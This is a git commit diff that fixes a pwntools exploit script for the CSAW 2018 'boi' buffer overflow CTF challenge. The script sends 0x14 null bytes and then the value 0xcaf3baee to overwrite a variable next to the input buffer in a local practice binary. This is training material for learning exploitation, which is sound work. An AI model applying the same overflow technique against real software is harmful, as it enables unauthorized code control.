a431436b7f1a3e137089ceb051ee33a9683f7eb2
lona9a <adrianbeckdev@gmail.com>
2021-07-27 14:56:39 +0200

    Solved variable bufferoverflow challenge boi from csaw 2018

--- nightmare-challenges/BOF/Variable/sploit.py
+++ nightmare-challenges/BOF/Variable/sploit.py
@@ -5,7 +5,10 @@ target = process('./boi')
 
 # 0x14 bytes of gap between the start of our input and the target int
 # 0xbeaf... 0x4 bytes is  what we will overwrite with 0xcaf3baee
-payload = "0"*0x14 + p32(0xcaf3baee).decode()
+payload = b"\x00"*0x14 + p32(0xcaf3baee)
+
+#bytes(14) + (0xcaf3baee).to_bytes(4,"little") 
+# bytes.fromhex("00" * 0x14 + "EE BA F3 CA")
 
 
 target.send(payload)
